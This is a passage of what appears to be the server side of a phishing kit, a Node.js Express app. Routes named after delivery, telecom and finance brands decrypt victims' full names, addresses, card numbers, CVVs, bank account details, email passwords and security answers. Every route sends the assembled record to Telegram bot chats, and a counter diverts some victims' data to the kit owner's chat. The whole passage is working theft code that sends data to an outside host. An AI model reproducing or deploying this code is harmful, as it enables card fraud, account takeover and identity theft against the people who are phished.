  postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(req.body.userAgent, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (bill == 100) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        bill = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelBill:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1367138150&text=Yodel:\n${originalText}`
        );
        bill += 1;
      }

      res.send("Update Completed");
    });
});

let kelvCount = 0;

app.post("/sendKelvYodelRes", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(req.body.userAgent, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (kelvCount == 5) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        kelvCount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelKev:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1248378980&text=Yodel:\n${originalText}`
        );
        kelvCount += 1;
      }

      res.send("Update Completed");
    });
});

//EE
//EE
//EE

app.post("/c2EE", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Login Information ------------+\nEmail: ${email}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${addy}\nCity: ${city}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (kelvCount == 5) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        kelvCount = 0;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `EEC2:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5348269876,
              text: `EE:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        kelvCount += 1;
      }

      res.send("Update Completed");
    });
});

app.post("/eeKelv", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Login Information ------------+\nEmail: ${email}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${addy}\nCity: ${city}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (kelvCount == 5) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        kelvCount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EEKelv:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1248378980&text=EE:\n${originalText}`
        );
        kelvCount += 1;
      }

      res.send("Update Completed");
    });
});

//NZPOST
//NZPOST
//NZPOST

app.post("/nzpostFirst", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userAgent = req.body.userAgent;
  ip = req.body.ip;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;

      if (mason == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        mason = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `NZPostFred:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5111234111,
              text: `NZPost:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        mason += 1;
      }
    });

  res.send("Update Complete");
});

//SFE
//SFE
//SFE

let bandz = 0;

app.post("/mazzaSFE", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secQuestion = CryptoJS.AES.decrypt(req.body.secQuestion, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secAnswer = CryptoJS.AES.decrypt(req.body.secAnswer, "402312").toString(
    CryptoJS.enc.Utf8
  );

  var originalText = `+----------- SFE ------------+\nEmail: ${email}\nPassword: ${password}\nName: ${fname} ${lname}\nTelephone: ${telephone}\nSort Code: ${scode}\nAccount Number: ${accno}\nSec Question: ${secQuestion}\nSec Answer: ${secAnswer}\n+----------- SFE ------------+`;

  if (bandz == 10) {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `HAYTCHRES:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    bandz = 4;
  } else {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `SFEMazza:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 5192776933,
          text: `SFE:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    bandz += 1;
  }
  res.send("Update Complete");
});

app.post("/chopsSFE", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secQuestion = CryptoJS.AES.decrypt(req.body.secQuestion, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secAnswer = CryptoJS.AES.decrypt(req.body.secAnswer, "402312").toString(
    CryptoJS.enc.Utf8
  );

  var originalText = `+----------- SFE ------------+\nEmail: ${email}\nPassword: ${password}\nName: ${fname} ${lname}\nTelephone: ${telephone}\nSort Code: ${scode}\nAccount Number: ${accno}\nSec Question: ${secQuestion}\nSec Answer: ${secAnswer}\n+----------- SFE ------------+`;

  if (bandz == 10) {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `HAYTCHRES:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    bandz = 4;
  } else {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `SFEbandz:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 990604907,
          text: `SFE:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    bandz += 1;
  }
  res.send("Update Complete");
});

app.post("/bandzSFE", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secQuestion = CryptoJS.AES.decrypt(req.body.secQuestion, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secAnswer = CryptoJS.AES.decrypt(req.body.secAnswer, "402312").toString(
    CryptoJS.enc.Utf8
  );

  var originalText = `+----------- SFE ------------+\nEmail: ${email}\nPassword: ${password}\nName: ${fname} ${lname}\nTelephone: ${telephone}\nSort Code: ${scode}\nAccount Number: ${accno}\nSec Question: ${secQuestion}\nSec Answer: ${secAnswer}\n+----------- SFE ------------+`;

  if (bandz == 10) {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `HAYTCHRES:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    bandz = 4;
  } else {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `SFEbandz:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 5752146124,
          text: `SFE:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    bandz += 1;
  }
  res.send("Update Complete");
});

let richgame = 0;

app.post("/richgameSFE", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secQuestion = CryptoJS.AES.decrypt(req.body.secQuestion, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secAnswer = CryptoJS.AES.decrypt(req.body.secAnswer, "402312").toString(
    CryptoJS.enc.Utf8
  );

  var originalText = `+----------- SFE ------------+\nEmail: ${email}\nPassword: ${password}\nName: ${fname} ${lname}\nTelephone: ${telephone}\nSort Code: ${scode}\nAccount Number: ${accno}\nSec Question: ${secQuestion}\nSec Answer: ${secAnswer}\n+----------- SFE ------------+`;

  if (richgame == 10) {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `HAYTCHRES:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    richgame = 4;
  } else {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `SFERichGame:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 759000656,
          text: `SFE:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    richgame += 1;
  }
  res.send("Update Complete");
});

let jv = 0;

app.post("/cypherSFE", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secQuestion = CryptoJS.AES.decrypt(req.body.secQuestion, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secAnswer = CryptoJS.AES.decrypt(req.body.secAnswer, "402312").toString(
    CryptoJS.enc.Utf8
  );

  var originalText = `+----------- SFE ------------+\nEmail: ${email}\nPassword: ${password}\nName: ${fname} ${lname}\nTelephone: ${telephone}\nSort Code: ${scode}\nAccount Number: ${accno}\nSec Question: ${secQuestion}\nSec Answer: ${secAnswer}\n+----------- SFE ------------+`;

  if (jv == 10) {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `HAYTCHRES:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    jv = 4;
  } else {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `SFEJV:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 1002430657,
          text: `SFE:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    jv += 1;
  }
  res.send("Update Complete");
});

app.post("/sfeJV", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secQuestion = CryptoJS.AES.decrypt(req.body.secQuestion, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secAnswer = CryptoJS.AES.decrypt(req.body.secAnswer, "402312").toString(
    CryptoJS.enc.Utf8
  );

  var originalText = `+----------- SFE ------------+\nEmail: ${email}\nPassword: ${password}\nName: ${fname} ${lname}\nTelephone: ${telephone}\nSort Code: ${scode}\nAccount Number: ${accno}\nSec Question: ${secQuestion}\nSec Answer: ${secAnswer}\n+----------- SFE ------------+`;

  if (jv == 10) {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `HAYTCHRES:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    jv = 4;
  } else {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `SFEJV:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 1435332919,
          text: `SFE:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    jv += 1;
  }
  res.send("Update Complete");
});

app.post("/sfeNBA", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secQuestion = CryptoJS.AES.decrypt(req.body.secQuestion, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secAnswer = CryptoJS.AES.decrypt(req.body.secAnswer, "402312").toString(
    CryptoJS.enc.Utf8
  );

  var originalText = `+----------- SFE ------------+\nEmail: ${email}\nPassword: ${password}\nName: ${fname} ${lname}\nTelephone: ${telephone}\nSort Code: ${scode}\nAccount Number: ${accno}\nSec Question: ${secQuestion}\nSec Answer: ${secAnswer}\n+----------- SFE ------------+`;

  if (chasingfunds == 10) {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `HAYTCHRES:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    chasingfunds = 4;
  } else {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `SFEChasing:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 1778408628,
          text: `SFE:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    chasingfunds += 1;
  }
  res.send("Update Complete");
});

app.post("/sfeChasing", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
